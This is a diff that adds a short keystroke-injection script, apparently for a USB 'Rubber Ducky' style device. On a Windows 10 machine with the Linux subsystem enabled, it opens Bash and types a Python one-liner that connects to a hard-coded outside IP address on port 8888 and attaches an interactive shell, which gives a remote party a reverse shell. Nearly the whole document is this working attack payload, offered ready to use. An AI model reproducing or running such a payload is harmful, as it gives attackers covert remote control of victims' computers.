@@ -1,0 +1,11 @@
+REM Reverse SSH Shell from windows10
+REM pc mus have ubuntu bash feature enabled
+DELAY 2000
+GUI
+DELAY 2000
+STRING BASH
+DELAY 800
+ENTER
+DELAY 2000
+STRING python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("198.211.104.139",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ENTER
